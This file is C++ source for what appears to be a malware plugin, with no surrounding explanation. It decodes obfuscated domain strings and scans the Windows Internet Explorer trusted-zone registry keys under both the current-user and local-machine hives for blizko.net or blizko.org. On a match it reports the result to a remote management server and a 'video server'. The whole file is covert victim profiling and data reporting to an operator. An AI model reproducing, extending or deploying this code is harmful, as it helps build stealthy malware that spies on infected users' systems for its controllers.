#include "plugins.h"
#include "core/reestr.h"
#include "manager.h"

namespace Plugins
{

static char* domains[] = { _CT_("blizko.net"), _CT_("blizko.org"), 0 };

static bool Find(Reestr& r)
{
	if( !r.Open( _CS_("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains") ) ) return false;
	int i = 0;
	StringBuilderStack<256> subKey;
	StringBuilderStack<64> mask;
	bool ret = false;
	while( r.Enum( subKey, i ) && !ret )
	{
		char** pm = domains;
		while( *pm )
		{
			mask = DECODE_STRING(*pm);
			if( subKey.IndexOf(mask) >= 0 )
			{
				ret = true;
				break;
			}
			pm++;
		}
		i++;
	}
	return ret;
}

static void SendResult()
{
	StringBuilderStack<8> s;
	s += 1;
	ManagerServer::SendData( _CT_("blizko.txt"), s.c_str(), 1, false );
	ManagerServer::SendFileToVideoServer( _CS_("TrustedHosts"), _CS_("blizko"), _CS_("txt"), s );
}

DWORD WINAPI TrustedHosts( void* )
{
	Reestr r1(HKEY_CURRENT_USER);
	if( Find(r1) )
		SendResult();
	Reestr r2(HKEY_LOCAL_MACHINE);
	if( Find(r2) )
		SendResult();

	return 0;
}

}
